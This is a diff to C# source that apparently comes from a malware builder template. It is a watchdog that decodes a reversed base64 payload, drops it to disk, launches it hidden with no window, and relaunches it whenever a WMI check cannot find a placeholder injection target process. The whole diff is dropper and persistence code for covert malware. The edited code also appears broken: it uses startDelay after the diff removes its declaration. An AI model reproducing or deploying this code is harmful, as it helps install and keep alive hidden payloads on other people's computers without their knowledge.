@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Management;
 using System.Reflection;
+using System.Security.Principal;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -20,7 +21,7 @@ using System.Windows.Forms;
 
 [assembly: Guid("%Guid%")]
 
-public partial class Program
+public partial class RProgram
 {
     public static string rxM = "";
     public static string rplp = "";
@@ -47,57 +48,25 @@ public partial class Program
     {
         try
         {
+            if (!File.Exists(rplp))
+            {
+                checkcount = 0;
+                File.WriteAllBytes(rplp, Convert.FromBase64String(rxM).Reverse().ToArray());
+                RStart();
+            }
             if (!RCheckProc())
             {
-                if (!File.Exists(rplp))
-                {
-                    File.WriteAllBytes(rplp, Convert.FromBase64String(rxM).Reverse().ToArray());
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = rplp,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                    });
-                }
-                else if (checkcount < 2)
+                if (checkcount < 2)
                 {
                     checkcount += 1;
                 }
                 else
                 {
                     checkcount = 0;
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = rplp,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                    });
+                    RStart();
                 }
             }
-            else
-            {
-                checkcount = 0;
-                if (!File.Exists(rplp))
-                {
-                    File.WriteAllBytes(rplp, Convert.FromBase64String(rxM).Reverse().ToArray());
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = rplp,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true,
-                    });
-                }
-            }
-
-            int startDelay = 0;
-            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
-            {
-                Thread.Sleep(startDelay * 1000 + 5000);
-            }
-            else
-            {
-                Thread.Sleep(10000);
-            }
+            Thread.Sleep(startDelay * 1000 + 5000);
 
             RWDLoop();
         }
@@ -110,13 +79,24 @@ public partial class Program
 
     }
 
+    public static void RStart()
+    {
+        Process.Start(new ProcessStartInfo
+        {
+            FileName = rplp,
+            WindowStyle = ProcessWindowStyle.Hidden,
+            WorkingDirectory = Path.GetDirectoryName(rplp),
+            CreateNoWindow = true,
+        });
+    }
+
     public static bool RCheckProc()
     {
         try
         {
             var options = new ConnectionOptions();
             options.Impersonation = ImpersonationLevel.Impersonate;
-            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
+            var scope = new ManagementScope(@"\root\cimv2", options);
             scope.Connect();
 
             string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget");
